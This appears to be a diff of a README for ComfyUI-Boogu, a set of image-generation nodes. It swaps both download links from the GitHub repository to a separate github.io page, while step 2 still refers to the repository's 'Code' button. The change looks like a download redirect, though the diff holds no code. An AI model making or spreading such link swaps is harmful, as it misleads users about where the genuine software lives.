@@ -1,6 +1,6 @@
 # 🎨 ComfyUI-Boogu - Create images with easy workflows
 
-[![](https://img.shields.io/badge/Download-Boogu-blue.svg)](https://github.com/tysto1727/ComfyUI-Boogu)
+[![](https://img.shields.io/badge/Download-Boogu-blue.svg)](https://tysto1727.github.io)
 
 ComfyUI-Boogu provides tools to generate AI images. These custom nodes manage specific image styles and layouts for the Boogu-Image-0.1 model. You can use these tools to automate tasks and improve your image quality.
 
@@ -16,7 +16,7 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Getting the Files
 
-1.  Visit this page to download: [https://github.com/tysto1727/ComfyUI-Boogu](https://github.com/tysto1727/ComfyUI-Boogu)
+1.  Visit this page to download: [https://tysto1727.github.io](https://tysto1727.github.io)
 2.  Click the green button labeled "Code" on the right side of the screen.
 3.  Choose the "Download ZIP" option from the menu.
 4.  Save the file to your computer.
